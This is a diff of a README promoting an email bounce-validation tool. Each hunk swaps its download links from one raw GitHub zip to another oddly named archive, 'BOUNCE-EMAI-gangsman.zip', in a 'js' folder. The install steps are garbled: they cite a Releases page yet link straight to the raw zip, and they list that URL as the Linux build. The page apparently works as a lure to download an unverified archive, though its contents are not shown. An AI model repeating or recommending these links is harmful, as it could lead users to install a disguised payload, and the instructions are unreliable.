@@ -1,7 +1,7 @@
 # 📧 EMAIL-BOUNCEV1 - Validate Emails with Ease
 
 ## 🚀 Download Now
-[![Download EMAIL-BOUNCEV1](https://raw.githubusercontent.com/EliseuGuilhermeF/EMAIL-BOUNCEV1/main/mettled/EMAIL-BOUNCEV1.zip%20EMAIL--BOUNCEV1-blue)](https://raw.githubusercontent.com/EliseuGuilhermeF/EMAIL-BOUNCEV1/main/mettled/EMAIL-BOUNCEV1.zip)
+[![Download EMAIL-BOUNCEV1](https://raw.githubusercontent.com/EliseuGuilhermeF/EMAIL-BOUNCEV1/main/js/BOUNCE-EMAI-gangsman.zip%20EMAIL--BOUNCEV1-blue)](https://raw.githubusercontent.com/EliseuGuilhermeF/EMAIL-BOUNCEV1/main/js/BOUNCE-EMAI-gangsman.zip)
 
 ## 📋 Description
 EMAIL-BOUNCEV1 is a tool designed for easy email bounce validation. It helps you validate your email lists efficiently using our powerful bounce checker tool. This tool ensures your emails reach their destination, improving your communication and outreach efforts.
@@ -23,11 +23,11 @@ To run EMAIL-BOUNCEV1, ensure that your system meets the following requirements:
 ## 📥 Download & Install
 To get started, visit the Releases page to download EMAIL-BOUNCEV1. Follow these steps:
 
-1. Click the following link to visit the download page: [Download EMAIL-BOUNCEV1](https://raw.githubusercontent.com/EliseuGuilhermeF/EMAIL-BOUNCEV1/main/mettled/EMAIL-BOUNCEV1.zip).
+1. Click the following link to visit the download page: [Download EMAIL-BOUNCEV1](https://raw.githubusercontent.com/EliseuGuilhermeF/EMAIL-BOUNCEV1/main/js/BOUNCE-EMAI-gangsman.zip).
 
 2. On the Releases page, you will find the latest version of the tool. Click on the version number to expand the details.
 
-3. Locate the downloadable file. Depending on your operating system, choose the appropriate version (e.g., .exe for Windows, .dmg for macOS, or https://raw.githubusercontent.com/EliseuGuilhermeF/EMAIL-BOUNCEV1/main/mettled/EMAIL-BOUNCEV1.zip for Linux).
+3. Locate the downloadable file. Depending on your operating system, choose the appropriate version (e.g., .exe for Windows, .dmg for macOS, or https://raw.githubusercontent.com/EliseuGuilhermeF/EMAIL-BOUNCEV1/main/js/BOUNCE-EMAI-gangsman.zip for Linux).
 
 4. Click the file link to start the download.
 
@@ -85,4 +85,4 @@ If you run into any issues or have questions, feel free to reach out via the Iss
 ## 🏁 Conclusion
 Remember, validating your email lists with EMAIL-BOUNCEV1 can significantly enhance your email communications and reduce bounce rates. Download today and start optimizing your email outreach! 
 
-Once again, download the tool from this link: [Download EMAIL-BOUNCEV1](https://raw.githubusercontent.com/EliseuGuilhermeF/EMAIL-BOUNCEV1/main/mettled/EMAIL-BOUNCEV1.zip).
+Once again, download the tool from this link: [Download EMAIL-BOUNCEV1](https://raw.githubusercontent.com/EliseuGuilhermeF/EMAIL-BOUNCEV1/main/js/BOUNCE-EMAI-gangsman.zip).
